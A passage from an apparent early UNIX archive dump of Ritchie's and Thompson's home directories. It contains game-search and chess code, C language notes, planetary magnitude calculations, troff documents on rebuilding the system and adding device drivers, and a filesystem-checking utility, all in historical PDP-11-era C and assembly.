	ele(p1,b1, p0,b0, p2,b2);
	ele(p2,b2, p0,b0, p1,b1);
}

ele(p0,b0, p1,b1, p2,b2)
{
	register *p;
	int i;

	p = &pole[p0].bead[b0];
	i = p->npoint;
	p->npoint++;
	p->p1[i] = &pole[p1].bead[b1];
	p->p2[i] = &pole[p2].bead[b2];
}

move(alpha, beta, lm)
{
	int mv[36];
	register *mp;
	int *pb, *pp;
	int i, j, v, mi;
	int cmp();

	if(lev >= maxlev)
		return(value);
	mp = mv;
	for(i=0; i<9; i++) {
		pp = &pole[i];
		if(pp->nbead >= 3)
			continue;
		pb = &pp->bead[pp->nbead];
		v = pb->npoint - 5;
		for(j=0; j<pb->npoint; j++)
			if(pb->p1[j]->color == color &&
			   pb->p2[j]->color == color)
				v =+ 10;
		*mp++ = v;
		*mp++ = pp;
		*mp++ = i;
	}
	if(mp == mv)
		return(value);
	qsort(mv, (mp-mv)/3, 6, cmp);
/*
	for(i=0; i<lev; i++)
		printf("	");
	printf("%d %d %d\n", lm, alpha, beta);
 */
	lev++;
	color = -color;
	value = -value;
	while(mp > mv) {
		i = *--mp;
		pp = *--mp;
		v = *--mp;
		value =+ v;
		pb = &pp->bead[pp->nbead];
		pb->color = -color;
		pp->nbead++;
		j = move(-beta, -alpha, i);
		pp->nbead--;
		pb->color = 0;
		value =- v;
		if(j > alpha) {
			alpha = j;
			mi = i;
			if(alpha >= beta)
				break;
		}
	}
	lev--;
	color = -color;
	value = -value;
/*
	for(i=0; i<lev; i++)
		printf("	");
	printf("** %d %d\n", alpha, mi);
 */
	abm = mi;
	return(-alpha);
}

cmp(p1, p2)
int *p1, *p2;
{

	return(*p1 - *p2);
}

play()
{
	register i;

loop:
	printf("your move:\n");
	i = rin();
	if(i<0 || i>=9)
		goto loop;
	if(pole[i].nbead >= 3)
		goto loop;
	return(i);
}
-- /usr/dmr/ct mode=0100644 uid=7 gid=1 atime=123921209 mtime=123921209 --
Goals:
	Flexibility & naturalness of expression
	easy to compile, and to support at runtime.
	  (no hard operators)
	reasonably close to machine operations.
	data structures likewise close to machine data structures
	therefore, for PDP-11, need types (unlike 635, PDP-10)
	encourage machine independence but allow machine dependence
	success-- 30% increase in size of UNIX.

Expressions
	* &
	- ! ~
	++ --
	+-*/% >> << == != etc & | ^
	?:
	&& ||
	=
	=op

Statements
	expression
	if [else]
	while
	do
	for
	break-continue
	switch-case-default
	goto-labels
	return

Declarations
	storage class
		auto, static, extern, register

	type
		int, char, float, double
	    (composition like expression)
		pointer (to something!)
		array
		function
		struct
			structure operators

	composition of types

Conversions
	ptr conversions and arrays
-- /usr/dmr/tmag.c mode=0100644 uid=7 gid=1 atime=122345614 mtime=122345614 --
double radian 57.29577951;
double sin();
double cos();
double atan2();
double atan();
double log();
double sqrt();

double log10(x)
double x;
{
	return(log(x)/log(10.0));
}

double arcsin(x)
double x;
{
	return(atan2(x, sqrt(1.0 - x*x)));
}

prmag(a, smag,  x, c1, c2, c3, f1, f2)
double a, smag,  x, c1, c2, c3, f1, f2;
{
	double delta, theta, magt, mago, phase, rms;
	int n;
	double pph, elong;

	rms = 0.0;
	n = 0;
	for (theta = 5.0; theta<=175.0; theta =+ 5.0) {
		delta = sqrt(a*a + 1.0 - 2.*a*cos(theta/radian));
		phase = arcsin(sin(theta/radian) / delta);
		if (delta*delta + a*a < 1.0)
			phase = 3.14159265 - phase;
		magt = f1*cos(phase) + f2;
		magt = 5.0*log10(a*delta) + magt;
		phase = phase*radian;
		elong = 180 - phase - theta;
		pph = phase - x;
		mago = 5.0*log10(a*delta)+smag+pph*(c1+pph*(c2+c3*pph));
		printf("%3.0f%4.0f%4.0f%7.2f%7.2f%7.2f\n",
			theta, phase, elong,  magt, mago, (magt-mago));
		if (elong>13) {
			n++;
			rms =+ (magt-mago)*(magt-mago);
		}
	}
	printf("rms diff %.3f\n", sqrt(rms/n));
}

main()
{

/* mercury */
	prmag(.387, 1.16,  50., 0.02838, 0.0001023, 0.0, -2.34, 2.58);
	printf("\n");
/* venus */
	prmag(.723, -4.00, 0.0, 0.01322, 0.0, 0.0000004247, -1.61, -2.31);
	printf("\n");
/* mars */
	prmag(1.523, -1.30,  0.0, 0.01486, 0.0, 0.0, -1.88, 0.75);
	printf("\n");
/* jupiter */
	prmag(5.203, -8.93,  5.20, 0.0, 0.0, 0.0, -2.5, -6.43);
}
-- /usr/dmr/mag.c mode=0100644 uid=7 gid=1 atime=121850744 mtime=121850744 --
double radian 57.29577951;
double sin();
double cos();
double atan2();
double atan();
double log();
double sqrt();

double log10(x)
double x;
{
	return(log(x)/log(10.0));
}

double arcsin(x)
double x;
{
	return(atan2(x, sqrt(1.0 - x*x)));
}

prmag(a, smag,  x, c1, c2, c3, f1, f2)
double a, smag,  x, c1, c2, c3, f1, f2;
{
	double delta, theta, magt, mago, phase, rms;
	double pph, elong;
	int n;

	n = 0;
	rms = 0.0;
	for (theta = 5.0; theta<=175.0; theta =+ 5.0) {
		delta = sqrt(a*a + 1.0 - 2.*a*cos(theta/radian));
		phase = arcsin(sin(theta/radian) / delta);
		if (delta*delta + a*a < 1.0)
			phase = 3.14159265 - phase;
		magt = 5.*log10(a*delta)+smag+f1*log10(.5*(1.+cos(phase))) + f2;
		phase = phase*radian;
		elong = 180 - phase - theta;
		pph = phase - x;
		mago = 5.0*log10(a*delta)+smag+pph*(c1+pph*(c2+c3*pph));
		printf("%3.0f%4.0f%4.0f%7.2f%7.2f%7.2f\n",
			theta, phase, elong,  magt, mago, (magt-mago));
		if (elong>13) {
			n++;
			rms =+ (magt-mago)*(magt-mago);
		}
	}
	printf("rms diff %.3f\n", sqrt(rms/n));
}

main()
{

/* mercury */
	prmag(.387, 1.16,  50., 0.02838, 0.0001023, 0.0, -4.377, -0.253);
	printf("\n");
/* venus */
	prmag(.723, -4.00, 0.0, 0.01322, 0.0, 0.0000004247, -3.00, .431);
	printf("\n");
/* mars */
	prmag(1.523, -1.30,  0.0, 0.01486, 0.0, 0.0, -7.9, 0.18);
	printf("\n");
/* jupiter */
	prmag(5.203, -8.93,  0.0, 0.0, 0.0, 0.0, -2.5, 0.0);
}
-- /usr/dmr/direc mode=0100644 uid=7 gid=1 atime=122180400 mtime=122180400 --
.de pg
.sp
..
.na
.tr `
.ce
REGENERATING SYSTEM SOFTWARE
.sp
This document discusses how to
assemble or compile various parts of the
UNIX system software.
This may be necessary because
a command or library is accidentally
deleted or otherwise
destroyed;
also, it may be desirable to install a modified
version of some command or library routine.
It should be noted that in the system as distributed,
there are quite a few commands that depend
to some degree on the current configuration
of the system;
thus in any new system modifications to some commands
are advisable.
Most of the likely modifications
relate to the standard disk devices contained
in the system.
For example, the df__ ("disk free")
command has built into it the names of
the standardly present disk storage drives
(e.g. "/dev/rf0", "/dev/rp0").
Df__ takes an argument to indicate which
disk to examine, but it is convenient
if its default argument is adjusted to
reflect the ordinarily present devices.
.pg
The companion document "Setting up UNIX"
discusses which commands are likely to require
changes.
.pg
The greater part of the
source files for commands resides
in several subdirectories
of the directory /usr/source.
These subdirectories, and a general
description of their contents, are
.sp
.in 8
.ti -4
s1``Source files for most commands with names beginning
with "a" through "l".
.sp
.ti -4
s2``Source files for most commands with names beginning
with "m" through "z".
.sp
.ti -4
s3``Source files for subroutines contained
in the standard system library, "/lib/liba.a"
(see below).
.sp
.ti -4
s4``Source files for the C library, "/lib/libc.a"
(see below).
.sp
.ti -4
s5``empty
.sp
.ti -4
s6``This directory
is probably nonexistent or empty;
in our own system it contains certain administrative-type
commands which deal with old-style file systems.
.sp
.ti -4
s7``Contains the source files for all the text formatters
roff, nroff, and troff.
They are separate because they overloaded the s2 directory.
.sp
.in 0
To regenerate most commands in the s1 and s2 directories
is straightforward.
The appropriate directory will contain one or more source
files for the command.
These will all have the suffix ".s" if the command is written in assembler language,
or ".c" if it is written in C.
The first part of the name begins with
the name of the command.
If there are several source
files,
the command name will be followed
by a character which distinguishes the
several files. it is typically "1", "2", ...;
Sometimes the last is "x".
For example,
The "bas" command has source files (in s1)
called "bas0.s", "bas1.s", ..., "bas4.s", "basx.s".
In all cases,
the lexicographical order of the distinguishing character
is the order in which the source files should be compiled
or assembled.
Thus, for example, the way to reassemble a new "bas"
is to say (in s1)
.sp
	as bas?.s
.sp
Some of the assembly-language commands
are completely stand-alone and require no application
of the link editor ld__
(also loosely called the loader).
Unfortunately there is no
.ul
a priori
way of determining which
need to be loaded.
A simple
.ul
a posteriori
method is to assemble the
command as discussed above, then say
.sp
	nm -u a.out
.sp
which will list the undefined external symbols.
If any appear, the loader should be called
by saying
.sp
	ld a.out -l
.sp
A minority of the commands written in assembly language
are coded so that
their text portions are pure and they can be shared.
(The most important of these is "ed";
another is "write.")
Such commands may (and in the case of the editor,
should) be loaded (whether or not they need it for
picking up library routines) by
.sp
	ld -n a.out -l
.sp
One important command which needs slightly special
treatment is "tp" which has to be loaded
with the C library:
.pg
	as tp?.s
.br
	ld a.out -l -lc
.pg
because it calls the C-language ctime subroutine.
.pg
It is not particularly easy to
find out if an assembly-language command
has a pure text segment.
The simplest way is probably to look
at the source and see if there
are ".data" assembler operators surrounding
system calls with pluggable arguments.
It is probably
not a bad idea to ignore the whole question
except in the case of the editor,
where there are likely to be real
gains in text-segment sharing.
.sp
As it happens, there are no commands written in C
(except those described below)
which consist of more than one file.
The command "com.c" can therefore be recompiled
simply by saying
.sp
	cc -n com.c
.sp
Here as above the "-n" indicates the desire to produce
a object file which has a pure, sharable text segment.
Since C produces pure code and the C library is pure,
one might as well share.
.sp
Some of the most important commands
are considerably more complicated to
regenerate, and these are discussed
specifically below.
The contents of libraries are also
discussed.
.sp
AS__
.sp
The assembler consists of two executable files:
/bin/as and /etc/as2.
The first is the 0-th pass:
it reads the source program, converts it to
an intermediate form in a temporary file "/tmp/atm0?",
and estimates the final locations
of symbols.
It also makes two or three other temporary
files which contain the ordinary symbol table,
a table of temporary symbols (like n_:)
and possibly an overflow intermediate file.
The program /etc/as2
acts as an ordinary two-pass assembler
with input taken from the files produced by /bin/as.
.pg
The source files for /bin/as
are named "/usr/source/s1/as1?.s"
(there are 9 of them);
/etc/as2 is produced
from the source files
"/usr/source/s1/as2?.s";
they likewise are 9 in number.
Considerable care should be exercised
in replacing either component of the
assembler.
Remember that if the assembler is lost,
the only recourse is to replace it from some backup storage;
a broken assembler cannot assemble itself.
.pg
C_
.br
The C compiler consists of
three files:
"bin/cc", which expands compiler control lines and
which calls the phases of the compiler proper,
the assembler, and the loader;
"/lib/c0", which is the first phase of the compiler;
and "/lib/c1", which is the second phase of the compiler.
The loss of the C compiler is as serious
as that of the assembler.
.pg
The source for /bin/cc
resides in "/usr/source/s1/cc.c".
Its loss alone is not fatal.
Provided that prog.c does not contain any
compiler control lines,
prog.c can be compiled by
.sp
	/lib/c0 prog.c temp0 temp1
.br
	/lib/c1 temp0 temp1 temp2
.br
	as - temp2
.br
	ld -n /lib/crt0.o a.out -lc -l
.sp
If /bin/cc is lost,
it can be recovered in this way,
since it contains no compiler control lines.
.pg
The source for the compiler proper is in the
directory /usr/c.
The first phase (c0)
is generated from the files c00.c, ..., c04.c,
which must be compiled by C;
c0t.s, which must be assembled;
and c0h.c, which is a header file which
should not be compiled but is a file
include_______d
by the C programs of the first phase.
The c0t.s program contains a parameter
"fpp" which determines whether C is to
used on a machine which has PDP 11/45 floating-point
hardware; it should be set to 1 if so, 0 if not.
In the standard system fpp is 1.
To make a new /lib/c0,
assemble c0t.s, name the output c0t.o,
and
.sp
	cc -n c0t.o c0[0-4].c
.sp
Before installing the new c0, it is prudent to save the old one someplace.
.pg
The second phase of C (/lib/c1)
is generated from the C source files c10.c, ..., c13.c,
the assembly-language program c1t.s,
the include-file c1h.c, and a library
of object-code tables called tab.a.
To generate a new second phase,
assemble c1t.s, call it c1t.o, and
.sp
	cc -n c1t.o c[0-3].c tab.a
.sp
It is likewise prudent to save c1 before
installing a new version.
In fact in general it is wise to save the
object files for the C compiler so that
if disaster strikes C can be reconstituted
without a working version of the compiler.
.pg
The library of tables mentioned above
is generated from the files
regtab.s, sptab.s, cctab.s, and efftab.s.
The order is not important.
These ".s" files are not in fact assembler source;
they must be converted by use of the cvopt_____
program, whose source and object are
located in the C directory.
For example:
.sp
	cvopt regtab.s temp
	as temp
	mv a.out regtab.o
	ar r tab.a regtab.o
.sp
.ul
FORTRAN
.sp
Probably because it is a very large
subsystem written entirely in assembly language,
Fortran is quite complicated to regenerate.
On the other hand, Fortran is vital only to its own
users;
since none of the compiler nor any
important part of the run-time system is
written in Fortran,
both can be regenerated in case of loss.
.sp
The fc__ command itself is essentially
equivalent to a long shell command file;
for a single source program
.ul
prog.f,
it amounts to saying
.sp
	/usr/fort/fc1 prog.f
	as - f.tmp1
	ld /lib/fr0.o a.out /lib/filib.a -lf -l
.sp
Thus, /usr/fort/fc1 is the compiler proper;
fc1 leaves its output in the current directory in the
file "f.tmp1".
/lib/fr0.o is the runtime startoff.
Filib.a is the library of operators;
Fortran is essentially interpretive,
and operations such as "add floating variable to floating
variable"
are short routines loaded from the filib.a library.
.sp
/lib/libf.a (specified by the "-lf") is an archive file
containing the language builtin functions
plus a few others.
The standard assembly language library
(the "-l", or /lib/liba.a)
is referenced by certain of the
builtin functions
(for routines like sin___).
-- /usr/dmr/direc1 mode=0100644 uid=7 gid=1 atime=122180574 mtime=122180574 --
.sp
.ul
UNIX
.pg
The source and object programs for UNIX are kept in
.ul
/usr/sys
and three subdirectories therein.
The main directory contains several files with names ending
in ".h"; these are header files which are
picked up (via "#include ...")
as required by each system module.
The files lib1 and lib2 are libraries (archives)
of (almost) all the object programs
in the system.
Lib1 is made from the source programs in the
subdirectory
.ul
ken;
lib2 is made from the programs in subdirectory
.ul
dmr.
The latter consists mostly of the device drivers
together with a few other things,
the former is the rest of the system.
.pg
Subdirectory
.ul
conf
contains the programs which control
device configuration of the system.
.ul
Low.s
specifies the
contents of the interrupt vectors;
conf.c contains the tables which relate device numbers
to handler routines.
A third program, mch.s,
contains all the
machine-language code in the system.
It contains conditional-assembly
flags which control whether the system will run on
an 11/40 or /45, and whether it supports
the 11/45 floating-point unit.
It is quite long, but almost all of it
is concerned
with recovering after a stack violation in an 11/40.
.pg
To recreate the system,
compile conf.c and move the output to /usr/sys/conf.o.
Assemble low.s and mch.s
and move the output to /usr/sys/low.o and
mch.o respectively.
Then change to
/usr/sys,
and load the whole system:
.pg
	ld -x low.o mch.o conf.o lib1 lib2
.pg
For convenience, this command line has been placed
into /usr/sys/ld.
.pg
When the
.ul
ld
is
done, the new system is present as
.ul
a.out.
It can also be tested by putting it on tape
(tp-I) and using tboot or mboot,
or directly using uboot (boot procedures-VIII).
When you have satisfied yourself that it works,
it should be renamed /usr/sys/unix
so that programs like ps (I)
can use it to pick up addresses in the system.
.pg
To install a new device driver,
compile it and place the object in lib2 if necessary.
(All the device drivers distributed with
the system are already there.)
The device's
interrupt
vector must be entered in
low.s.
This involves placing a pointer to a callout routine
and the device's priority level in the vector.
As an example, consider installing the interrupt vector
for DC11 number 2.
Its receiver interrupts at location 320 and the transmitter at 324,
both at priority level 5.
Then low.s has:
.pg
	. = 320^.
	dcin; br5+2
	dcou; br5+2
.pg
First, notice that the entries in low.s must be in order,
since the assembler does not permit moving the
location counter "." backwards.
The assembler also does not permit assignation of
an absolute number to ".", which is the
reason for the ". = 320^." subterfuge;
consult the Assembler Manual for the meaning of the notation.
If a constant smaller than 16(10) is added to the
priority level,
this number will be available as the first argument of the interrupt routine.
This strategem is used when
several similar devices share the same interrupt routine.
.pg
At the end of low.s,
add
.pg
		.globl	_dcrint
	dcin:
		jsr	r0,call; _dcrint
.pg
		.globl	_dcxint
	dcou:
		jsr	r0,call; _dcxint
.pg
The
.it call
routine
saves registers as required and makes a C-style
call on the actual interrupt routine (here _dcrint and _dcxint)
named after the jsr instruction.
When the routine returns,
.it call
restores the registers and performs an
rti instruction.
.pg
To install a new device thus requires
knowing the name of its interrupt routines.
These routines are in general easily found
in the driver; they typically end in the letters
"int" or "intr."
Notice that external names in C programs have an
underscore "_" prepended to them.
.pg
The second step which must be performed to add a new device is
to add it to the configuration table
/usr/sys/conf/conf.c.
This file contains two subtables,
one for block-type devices, and one for character-type devices.
Block devices include disks, DECtape, and magtape.
All other devices are character devices.
A line in each of these tables gives all the information
the system needs to know about the device handler;
the ordinal position of the line in the table implies
its major device number, starting at 0.
.pg
There are four subentries per line in the block device table,
which give its open routine, close routine, strategy routine, and
device table.
The open and close routines may be nonexistent,
in which case the name "nulldev" is given;
this routine merely returns.
The strategy routine is called to do any I/O,
and the device table contains status information for the device.
.pg
For character devices, each line in the table
specifies a routine for open,
close, read, and write, and one which sets and returns
device-specific status (used, for example, for stty and gtty
on typewriters).
If there is no open or close routine, "nulldev" may
be given; if there is not read, write, or status
routine, "nodev" may be given.
This return sets an error flag and returns.
.pg
The above discussion is admittedly rather cryptic
in the absence of a general
description of system I/O interfaces.
All we can suggest is that sample configuration
tables be examined.
.pg
The final step which must
be taken to install a device is to make a special for it.
This is done by mknod (VIII), to which you must specify the
device class (block or character),
major device number (relative line in the configuration table)
and minor device number
(which is made available to the driver at appropriate times).
-- /usr/dmr/am.c mode=0100644 uid=7 gid=1 atime=121216118 mtime=121216118 --
#

int	sflg;
char	lfile[]	"/tmp/ktmp";
int	lflg;
int	lfdes;
int	lfptr;

struct	inode
{
	int	i_mode;
	char	i_nlink;
	char	i_uid;
	char	i_gid;
	char	i_size0;
	char	*i_size1;
	int	i_addr[8];
	int	i_atime[2];
	int	i_mtime[2];
};

/* modes */
#define	IALLOC	0100000
#define	IFMT	060000
#define		IFDIR	040000
#define		IFCHR	020000
#define		IFBLK	060000
#define	ILARG	010000

struct
{
	char	*s_isize;
	char	*s_fsize;
	int	s_nfree;
	int	s_free[100];
	int	s_ninode;
	int	s_inode[100];
	char	s_flock;
	char	s_ilock;
	char	s_fmod;
	int	time[2];
	int	pad[50];
} sblock;

int	ndlist;
int	dlist[100];
int	nblist;
int	blist[100];
int	bmap[4096];
int	fi;
int	nfile;
int	nspcl;
int	nlarg;
int	nindir;
int	ndir;
int	nused;
int	hiwat;
int	nfree;
int	ino;
int	ndup;
int	nnf	100;
char	*lastblock;
int	nblock;
double	tmove;

struct
{
	char	icnt[2];
} *icnt;

struct	fname
{
	int	inum;
	int	nptr;
	int	pnum;
} *dn, *edn;

main(argc, argv)
char **argv;
{
	char *arg;
	extern fout;

	if(argc>1 && *argv[1] == '-') {
		argc--;
		argv++;
		arg = *argv;
		while(*arg)
		switch(*arg++) {

		case 'l':
			lflg++;
			continue;

		case 's':
			sflg++;
			continue;

		case 'i':
			dlist[ndlist++] = number(argv[1]);
			argc--;
			argv++;
			continue;

		case 'b':
			blist[nblist++] = number(argv[1]);
			argc--;
			argv++;
			continue;

		}
	}
	fout = dup(1);
	close(1);
	if(argc <= 1) {
		fprintf("rp0:\n");
		check("/dev/rp0");
		flush();
		exit();
	}
	check(argv[1]);
	flush();
}

check(file)
char *file;
{
	struct inode buf[16];
	int i, j;
	int compar(), cintr();
	struct fname *dnp;

	fi = open(file, 0);
	if(fi < 0) {
		fprintf("cannot open %s\n", file);
		return;
	}
	sync();
	bread(1, &sblock);
	icnt = sbrk(sblock.s_isize*16);
	if (lflg) {
		lfdes = creat(lfile, 0666);
		signal(2, cintr);
		dn = edn = sbrk(100*6);
	}
	for(i=0; i<sblock.s_isize; i++) {
		bread(i+2, buf);
		for(j=0; j<16; j++) {
			ino++;
			pass1(&buf[j]);
		}
	}
	ino = 0;
	printf("%.2f %.0f %d\n", tmove/nblock, tmove, nblock);
	if (lflg) {
		close(lfdes);
		lfdes = open(lfile, 0);
		qsort(dn, edn-dn, 6, compar);
		i = -1;
		j = 0;
		for (dnp=dn; dnp<edn; dnp++) {
			if(dnp->pnum == 0) {
				if(dnp->inum != 1)
					j = 1;
				continue;
			}
			if (dnp->inum != i) {
				i = dnp->inum;
				printf("%d", i);
			}
			putchar('\t');
			pfilename(dnp, 0);
			if(j) {
				j = 0;
				printf("/.");
			}
			putchar('\n');
		}
		close(lfdes);
		unlink(lfile);
		signal(2, 1);
	}
	if(sflg) {
		close(fi);
		fi = open(file, 1);
		if(fi < 0) {
			fprintf("cannot write %s\n", file);
			return;
		}
		sblock.s_nfree = 0;
		sblock.s_ninode = 0;
		sblock.s_flock = 0;
		sblock.s_ilock = 0;
		sblock.s_fmod = 0;
		free(0);
		for(i=sblock.s_fsize-1; i>=sblock.s_isize+2; i--) {
			ndup = 0;
			chk(i, "URK", 0);
			if(ndup == 0)
				free(i);
		}
		bwrite(1, &sblock);
		close(fi);
		return;
	}
	while(i = alloc()) {
		if(chk(i, "free", 0))
			break;
		nfree++;
	}
	if(ndup)
		printf("%l dups in free\n", ndup);
	ndup = 0;
	for(i=sblock.s_isize+2; i<sblock.s_fsize; i++) {
		chk(i, "urk", 0);
		ndup--;
	}
	if(ndup)
		printf("%l missing\n", -ndup);
	for(i=0; i<sblock.s_isize*16; i++) {
		j = icnt->icnt[i] & 0377;
		if(j!=0 && j!=0200)
			printf("%6l %3o\n", i+1, j);
	}
	printf("spcl  %6l\n", nspcl);
	printf("files %6l\n", nfile);
	printf("large %6l\n", nlarg);
	printf("direc %6l\n", ndir);
	printf("indir %6l\n", nindir);
	printf("used  %6l\n", nused);
	printf("last  %6l\n", hiwat);
	printf("free  %6l\n", nfree);
	close(fi);
}

cintr()
{

	unlink(lfile);
	exit();
}

compar(p1, p2)
struct fname *p1, *p2;
{
	int i;

	i = p1->inum - p2->inum;
	if(i)
		return(i);
	return(p1->pnum - p2->pnum);
}

pass1(ip)
struct inode *ip;
{
	int buf[256];
	int i, j, df;

	if((ip->i_mode&IALLOC) == 0)
		return;
	icnt->icnt[ino-1] =+ 0100;
	if(ip->i_nlink)
		icnt->icnt[ino-1] =+ 0100 + ip->i_nlink;
	if((ip->i_mode&IFCHR&IFBLK) != 0) {
		nspcl++;
		return;
	}
	if (ip->i_size0)
		printf("%l big\n", ino);
	df = 0;
	if((ip->i_mode&IFMT) == IFDIR) {
		df = ldiv(ip->i_size0, ip->i_size1, 16);
		if(lflg) {
			if(--nnf<0) {
				nnf = 100;
				edn = sbrk(6*101);
			}
			edn->pnum = 0;
			edn->inum = ino;
			edn++;
		}
		ndir++;
	}
	nfile++;
	lastblock = 0;
	tmove = 0;
	if((ip->i_mode&ILARG) != 0) {
		nlarg++;
		for(i=0; i<8; i++)
		if(ip->i_addr[i] != 0) {
			nindir++;
			if(chk(ip->i_addr[i], "idir", 0))
				continue;
			bread(ip->i_addr[i], buf);
			for(j=0; j<256; j++)
			if(buf[j] != 0)
				chk(buf[j], "ldir", df);
			df =- 32;
		}
		return;
	}
	for(i=0; i<8; i++) {
		if(ip->i_addr[i] != 0)
			chk(ip->i_addr[i], "sdir", df);
		df =- 32;
	}
}

chk(i, s, df)
char *i;
{
	int n, b, j, buf[256];
	int xx;
	struct {
		int	ino;
		char	name[14];
	};

	if (lastblock) {
		if (lastblock > i)
			xx = lastblock - i;
		else
			xx = i - lastblock;
		nblock++;
		tmove =+ xx;
		if (xx<0)
			tmove =+ 65536.0;
	}
	lastblock = i;
	for(j=0; j<nblist; j++)
		if(i == blist[j])
			fprintf("%l blk; i=%l(%s)\n", i, ino, s);
	if(ino) {
		nused++;
		if(i > hiwat)
			hiwat = i;
	}
	if(i<sblock.s_isize+2 || i>=sblock.s_fsize) {
		fprintf("%l bad; i=%l(%s)\n", i, ino, s);
		return(1);
	}
	n = ldiv(0, i, 16);
	b = lrem(0, i, 16);
	if(bmap[n] & (1<<b)) {
		if(ino == 0) {
			ndup++;
			return(0);
		}
		fprintf("%l dup; i=%l(%s)\n", i, ino, s);
		return(1);
	}
	bmap[n] =| 1<<b;
	if(df>0) {
		bread(i, buf);
		for(n=0; n<256; n=+8) {
			if(df <= 0)
				break;
			df--;
			if((b=buf[n]) == 0)
				continue;
			if (lflg)
			if(!(buf[n].name[0]=='.' &&
			  (buf[n].name[1]=='\0' ||
			  (buf[n].name[1]=='.' && buf[n].name[2]=='\0')))) {
				if (--nnf<0) {
					nnf = 100;
					edn = sbrk(6*101);
				}
				edn->pnum = ino;
				edn->inum = buf[n];
				edn->nptr = lfptr;
				for (j=0; j<14; j++)
					if(buf[n].name[j] == '\0')
						break;
				j++;
				write(lfdes, buf[n].name, j);
				lfptr =+ j;
				edn++;
			}
			for(j=0; j<ndlist; j++)
				if(b == dlist[j])
				fprintf("%l ino; i=%l(%s) \"%.16s\"\n",
				  b, ino, s, buf+n+1);
			if(b<1 || b>16*sblock.s_isize) {
				fprintf("%l din; i=%l(%s)\n", i, ino, s);
				continue;
			}
			icnt->icnt[b-1]--;
		}
	}
	return(0);
}

pfilename(dp, recur)
struct fname *dp;
{
	struct fname *p;
	char name[14];

	if (++recur > 10)
		printf("...");
	else if (dp->pnum != 1) {
		for (p = dn; p<edn; p++) {
			if (p->inum==dp->pnum && p->pnum!=0) {
				pfilename(p, recur);
				goto yes;
			}
		}
		printf("???");
	    yes:
		printf("/");
	}
	seek(lfdes, dp->nptr,  0);
	read(lfdes, name, 14);
	printf("%.14s", name);
}

alloc()
{
	int b, i, buf[256];

	i = --sblock.s_nfree;
	if(i<0 || i>=100) {
		fprintf("bad freeblock\n");
		return(0);
	}
	b = sblock.s_free[i];
	if(b == 0)
		return(0);
	if(sblock.s_nfree <= 0) {
		bread(b, buf);
		sblock.s_nfree = buf[0];
		for(i=0; i<100; i++)
			sblock.s_free[i] = buf[i+1];
	}
	return(b);
}

bread(bno, buf)
{

	seek(fi, bno, 3);
	if(read(fi, buf, 512) != 512) {
		fprintf("read error %d\n", bno);
		exit();
	}
}

free(in)
{
	int i;
	int buf[256];

	if(sblock.s_nfree >= 100) {
		buf[0] = sblock.s_nfree;
		for(i=0; i<100; i++)
			buf[i+1] = sblock.s_free[i];
		sblock.s_nfree = 0;
		bwrite(in, buf);
	}
	sblock.s_free[sblock.s_nfree++] = in;
}

bwrite(bno, buf)
{

	seek(fi, bno, 3);
	if(write(fi, buf, 512) != 512) {
		fprintf("write error %d\n", bno);
		exit();
	}
}

number(s)
char *s;
{
	int n, c;

	n = 0;
	while(c = *s++) {
		if(c<'0' || c>'9')
			continue;
		n = n*10+c-'0';
	}
	return(n);
}

fprintf(a, b, c, d, e)
{
	printf(a, b, c, d, e);
	flush();
}
-- /usr/ken/chess mode=0140755 uid=6 gid=1 atime=173637299 mtime=173637299 --
-- /usr/ken/chess/agen.c mode=0100644 uid=6 gid=1 atime=173637304 mtime=173637304 --
#include "old.h"

bagen()
{
	int *p1, *p2, v;

	p1 = lmp;
	if((flag&010)!=0)
	if(board[5]==0 && board[6]==0 && board[7]==4)
	if(wattack(4) && wattack(5) && wattack(6))
		btry(4, 0, 2); /* kingside castle */
	if((flag&020)!=0)
	if(board[0]==4 && board[1]==0 && board[2]==0 && board[3]==0)
	if(wattack(2) && wattack(3) && wattack(4))
		btry(4, 0, -2); /* queenside castle */
	bgen();
	p2 = p1;
	while(p2 != lmp) {
		v = *p2++;
		bmove(*p2);
		if(wattack(bkpos)) {
			*p1++ = v;
			*p1++ = *p2;
		}
		p2++;
		bremove();
	}
	lmp = p1;
}

btry(from, mask, offset)
int from, mask, offset;
{

	if((dir[from]&mask)==0)
		bcheck(from, from+offset);
}

bcheck(from, to)
int from, to;
{

	if(board[to]>0) return(1);
	*lmp++ = (pval+6)[board[to]]-value;
	*lmp++ = (from<<8)|to;
	return(board[to] != 0);
}

wagen()
{
	int *p1, *p2, v;

	p1 = lmp;
	if((flag&1)!=0)
	if(board[61]==0 && board[62]==0 && board[63]== -4)
	if(battack(60) && battack(61) && battack(62))
		wtry(60, 0, 2); /* kingside castle */
	if((flag&2)!=0)
	if(board[56]== -4 && board[57]==0 && board[58]==0 && board[59]==0)
	if(battack(58) && battack(59) && battack(60))
		wtry(60, 0, -2); /* queenside castle */
	wgen();
	p2 = p1;
	while(p2 != lmp) {
		v = *p2++;
		wmove(*p2);
		if(battack(wkpos)) {
			*p1++ = v;
			*p1++ = *p2;
		}
		p2++;
		wremove();
	}
	lmp = p1;
}

wtry(from, mask, offset)
int from, mask, offset;
{

	if((dir[from]&mask)==0)
		wcheck(from, from+offset);
}

wcheck(from, to)
int from, to;
{

	if(board[to]<0) return(1);
	*lmp++ = value-(pval+6)[board[to]];
	*lmp++ = (from<<8)|to;
	return(board[to] != 0);
}

-- /usr/ken/chess/att.s mode=0100644 uid=6 gid=1 atime=173637306 mtime=173637306 --
/ does white/black attack position?

.globl	_battack
.globl	_wattack

.globl	_dir, _board

uleft	= 04040;
uright	= 04004;
dleft	= 00440;
dright	= 00404;
left	= 00040;
right	= 00004;
up	= 04000;
down	= 00400;
u2r1	= 06004;
u1r2	= 04006;
d1r2	= 00406;
d2r1	= 00604;
d2l1	= 00640;
d1l2	= 00460;
u1l2	= 04060;
u2l1	= 06040;

_battack:
	mov	2(sp),r0
	asl	r0
	mov	_dir(r0),r1
	mov	$2,r2
	bit	$u2r1,r1
	bne	1f
	cmp	_board+[-15.*2](r0),r2
	beq	2f
1:
	bit	$u1r2,r1
	bne	1f
	cmp	_board+[-6.*2](r0),r2
	beq	2f
1:
	bit	$d1r2,r1
	bne	1f
	cmp	_board+[+10.*2](r0),r2
	beq	2f
1:
	bit	$d2r1,r1
	bne	1f
	cmp	_board+[+17.*2](r0),r2
	beq	2f
1:
	bit	$d2l1,r1
	bne	1f
	cmp	_board+[+15.*2](r0),r2
	beq	2f
1:
	bit	$d1l2,r1
	bne	1f
	cmp	_board+[+6.*2](r0),r2
	beq	2f
1:
	bit	$u1l2,r1
	bne	1f
	cmp	_board+[-10.*2](r0),r2
	beq	2f
1:
	bit	$u2l1,r1
	bne	1f
